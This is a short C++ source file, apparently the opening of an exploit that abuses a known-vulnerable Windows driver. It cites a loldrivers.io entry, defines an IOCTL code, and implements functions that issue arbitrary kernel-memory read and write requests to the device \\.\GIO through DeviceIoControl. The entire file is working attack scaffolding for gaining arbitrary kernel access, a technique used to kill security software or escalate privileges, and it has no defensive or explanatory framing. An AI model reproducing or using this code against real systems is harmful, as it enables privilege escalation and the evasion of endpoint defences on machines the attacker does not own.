#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelWritePrimitive kwp;
	kwp.dst = dst;
	kwp.src = src;
	kwp.size = size;

	BYTE bufferReturned[48] = { 0 };
	DWORD returned = 0;
	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
	if (!result) {
		cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
	return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelReadPrimitive krp;
	krp.dst = dst;
	krp.src = src;
	krp.size = size;


	DWORD returned = 0;

	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
	if (!result) {
		cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	return TRUE;
}

HANDLE openVulnDriver() {
	HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!driver || driver == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
		return NULL;
	}
	return driver;
}